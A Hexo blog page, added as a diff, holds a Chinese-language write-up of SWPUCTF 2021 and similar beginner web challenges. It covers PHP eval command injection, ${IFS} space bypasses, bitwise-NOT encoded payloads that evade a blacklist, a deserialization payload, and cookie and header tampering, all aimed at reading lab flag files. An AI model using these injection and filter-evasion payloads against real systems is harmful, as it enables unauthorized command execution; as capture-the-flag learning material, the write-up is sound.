@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="web 题解复现1[SWPUCTF 2021 新生赛]easyrce![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 174550.png) 首先进行代码审计 发现了eval（）函数，eval（）函数是命令执行函数，常见的命令执行函数还有 system()passthru()exec()shell_exec()popen()proc_o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/03/15/web%E5%A4%8D%E7%8E%B01/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web 题解复现1[SWPUCTF 2021 新生赛]easyrce![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 174550.png) 首先进行代码审计 发现了eval（）函数，eval（）函数是命令执行函数，常见的命令执行函数还有 system()passthru()exec()shell_exec()popen()proc_o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\c643f2a5aee7fd20d6377bbea91ff0e1.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\bd1baf0e2d3867582e9937cca4da2b31.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\d11182321d3620cd3a7f11e2cf6df8e5.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\ec0e39ea1f32223a508857a03345dc77.png">
+<meta property="og:image" content="c:\Users\21649\AppData\Local\Temp\17c6161dbbf9b07fbcaa19aa123c45e0.png">
+<meta property="article:published_time" content="2025-03-15T13:12:42.142Z">
+<meta property="article:modified_time" content="2025-03-15T13:14:49.497Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\21649\AppData\Local\Temp\c643f2a5aee7fd20d6377bbea91ff0e1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web复现1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/" class="article-date">
+  <time class="dt-published" datetime="2025-03-15T13:12:42.142Z" itemprop="datePublished">2025-03-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="web-题解复现1"><a href="#web-题解复现1" class="headerlink" title="web 题解复现1"></a>web 题解复现1</h1><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 174550.png)</p>
+<p>首先进行代码审计</p>
+<p>发现了<strong>eval（）函数</strong>，<strong>eval（）函数</strong>是命令执行函数，常见的命令执行函数还有</p>
+<p><strong>system()</strong><br><strong>passthru()</strong><br><strong>exec()</strong><br><strong>shell_exec()</strong><br><strong>popen()</strong><br><strong>proc_open()</strong><br><strong>pcntl_exec()</strong></p>
+<p>直接使用system（）函数查看根目录下面有什么</p>
+<p>system（）函数的作用为执行系统命令并输出结果</p>
+<p>plyload:?url&#x3D;system(“ls%20&#x2F;“)；&#x2F;&#x2F;%20是空格的url编码</p>
+<p><strong>此处为什么要有空格</strong></p>
+<p>在命令执行的时候，空格是一个非常重要的分隔符，主要用于区分命令的不同组成部分，主要有四种用处</p>
+<ol>
+<li>分隔命令名称与参数</li>
+<li>分隔多个参数</li>
+<li>处理特殊字符的安全性</li>
+<li>影响某些特定功能的行为</li>
+</ol>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 175515.png)</p>
+<p>到这个这个页面，我们看到了一个疑似flag的文件，我们去尝试获取文件的所有内容</p>
+<p>payload：?url&#x3D;system(“cat%20&#x2F;flllllaaaaaaggggggg”);</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181146.png)</p>
+<p>这样我们就得到了这道题的flag</p>
+<h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181600.png)</p>
+<p>首先进行代码审计</p>
+<p>if的条件要求是$_COOKIE[‘admin’]是否等于1；我们先尝试着满足条件</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 181909.png)</p>
+<p>此时回显了一个php文件，我们去访问它</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 182858.png)</p>
+<p>首先会看到preg_match()函数用于执行一个正则表达式匹配，搜素字符串与给定模式匹配的内容</p>
+<p>这行代码的意思是过滤了空格</p>
+<p>再往下看，看到了shell_exec()函数，考虑是命令执行</p>
+<p><strong>shell_exec()函数与exec（）函数的区别：</strong></p>
+<ol>
+<li><p>shell_exec（）函数<strong>返回值</strong>: 返回命令执行后的完整输出作为字符串。而exec（）函数<strong>返回值</strong>: 返回命令执行结果的最后一行输出，而不是整个输出。此外，它还可以通过引用参数获取输出的每一行和返回状态。</p>
+<p>IFS是一个特殊环境变量，叫做内部字段分隔符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ls$&#123;IFS&#125;/</span><br></pre></td></tr></table></figure>
+
+<p>$ IFS$1(1可以换成其它的数字)$IFS$9,${IFS},$IFS,都能代替空格，</p>
+<p>payload：？url&#x3D;ls$IFS$9&#x2F;</p>
+</li>
+</ol>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 195817.png)</p>
+<p>然后我们就要获取文件里的内容，仍要注意不能使用空格</p>
+<p>payload: ?url&#x3D;cat${IFS}&#x2F;flllllaaaaaaggggggg</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 200036.png)</p>
+<p>最后得到flag</p>
+<h1 id="一道简单的反序列化"><a href="#一道简单的反序列化" class="headerlink" title="一道简单的反序列化"></a>一道简单的反序列化</h1><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 200956.png)</p>
+<p>首先进行代码审计，我们可以发现定义了一个名字叫Fun的类,变量fun创建了一个新的队形，变量ser是变量fun的反序列化，当传入的变量un和ser相等时，才会输出flag</p>
+<p>复制代码在本地运行，输出ser变量</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\c643f2a5aee7fd20d6377bbea91ff0e1.png" alt="c643f2a5aee7fd20d6377bbea91ff0e1"></p>
+<p>payload: ?un&#x3D;O:3:”Fun”:3:{s:4:”name”;s:5:”vFREE”;s:3:”age”;s:2:”19”;s:4:”look”;s:8:”handsome”;}</p>
+<p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 201542.png)</p>
+<p>这样就得到了flag</p>
+<h1 id="SWPUCTF-2021-新生赛-hardrce-1"><a href="#SWPUCTF-2021-新生赛-hardrce-1" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure>
+
+<p>进行代码审计，可以发现代码过滤了一大堆的符号和字母</p>
+<p>还有eval语句</p>
+<p>对需要使用的函数进行取反，然后进行url编码，之所以使用取反操作，是因为取反操作基本上用的是不可见字符，所以不会触发正则匹配</p>
+<p>~进行取反操作，在php种urlencode（）函数用于对字符串进行url编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后 分别取反，构造payload：?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C%DF%D0);</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\bd1baf0e2d3867582e9937cca4da2b31.png" alt="bd1baf0e2d3867582e9937cca4da2b31"></p>
+<p>相同的道理将获取文件内容同样取反</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：?wllm&#x3D;(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</p>
+<p>最后得到flag</p>
+<h1 id="strlen-intval绕过"><a href="#strlen-intval绕过" class="headerlink" title="strlen+intval绕过"></a>strlen+intval绕过</h1><p>![](C:\Users\21649\Pictures\Screenshots\屏幕截图 2025-03-15 203147.png)</p>
+<p>进行代码审计, PHP 中，<code>intval()</code> 函数用于将变量转换为整数类型。它会尝试从给定的变量中提取一个整数值，并根据需要进行类型转换。</p>
+<p>strlen（）函数是求长度的函数</p>
+<p>这道题需要满足的条件是num的长度小于等于四，并且num+1经过intval（）处理后大于500000</p>
+<p>这里可以使用到科学计数法，5e5表示5乘10的5次方</p>
+<p>payload：?num&#x3D;5e5;</p>
+<h1 id="rec-eval执行"><a href="#rec-eval执行" class="headerlink" title="rec eval执行"></a>rec eval执行</h1><p><img src="C:\Users\21649\AppData\Local\Temp\d11182321d3620cd3a7f11e2cf6df8e5.png" alt="d11182321d3620cd3a7f11e2cf6df8e5"></p>
+<p>进行代码审计，看eval（）函数，考虑命令执行</p>
+<p>payload：&#x2F;?cmd&#x3D;system(“ls &#x2F;“);</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png" alt="49fbc4fcf55d90dab1243eb24a7abcf3"></p>
+<p>然后获取文件的内容</p>
+<p>payload：&#x2F;?cmd&#x3D;system(“cat &#x2F;flag_1203”);		</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\49fbc4fcf55d90dab1243eb24a7abcf3.png" alt="49fbc4fcf55d90dab1243eb24a7abcf3"></p>
+<h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p><img src="C:\Users\21649\AppData\Local\Temp\ec0e39ea1f32223a508857a03345dc77.png" alt="ec0e39ea1f32223a508857a03345dc77"></p>
+<p>使用bp抓包，把请求头改为CTFHUB</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>用bp抓包之后，发现了admin&#x3D;0</p>
+<p>0（false）1（true）</p>
+<p><img src="C:\Users\21649\AppData\Local\Temp\17c6161dbbf9b07fbcaa19aa123c45e0.png" alt="17c6161dbbf9b07fbcaa19aa123c45e0"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/03/15/web%E5%A4%8D%E7%8E%B01/" data-id="cm8a8wwbc0007mcvqbr95gpqy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/03/15/web%E5%A4%8D%E7%8E%B01/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/26/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/22/%E6%96%B0%E7%94%9F%E8%B5%9Bwp/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/12/19/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
